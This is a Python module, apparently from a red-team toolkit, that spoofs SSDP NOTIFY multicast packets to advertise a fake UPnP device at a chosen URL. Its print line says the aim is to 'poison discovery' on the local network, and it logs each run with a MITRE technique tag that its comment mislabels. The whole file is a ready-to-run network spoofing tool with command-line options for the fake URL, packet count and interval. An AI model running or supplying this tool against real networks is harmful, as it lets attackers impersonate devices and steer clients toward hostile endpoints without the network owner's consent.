# modules/exploits/ssdp_probe_injector.py

import socket
import argparse
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1200"  # Network Sniffing / T1496 - Resource Hijacking

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_ssdp_spoof(device_url, interval, repeat):
    msg = (
        'NOTIFY * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'CACHE-CONTROL: max-age=1800\r\n'
        'LOCATION: {}\r\n'
        'NT: upnp:rootdevice\r\n'
        'NTS: ssdp:alive\r\n'
        'SERVER: REDoT/1.0 UPnP/1.1 Python/3\r\n'
        'USN: uuid:fake-device::upnp:rootdevice\r\n'
        '\r\n'
    ).format(device_url)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    ttl = 2
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

    for i in range(repeat):
        sock.sendto(msg.encode(), ("239.255.255.250", 1900))
        print(f"[âœ“] SSDP packet sent ({i+1}/{repeat}) to poison discovery")
        time.sleep(interval)

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "spoofed_location": device_url,
        "repeat": repeat,
        "interval": interval,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSDP Probe Injector")
    parser.add_argument("--url", required=True, help="Fake location/URL to advertise")
    parser.add_argument("--repeat", type=int, default=5, help="Number of SSDP packets to send")
    parser.add_argument("--interval", type=float, default=1.0, help="Interval between SSDP packets")
    args = parser.parse_args()

    send_ssdp_spoof(args.url, args.interval, args.repeat)
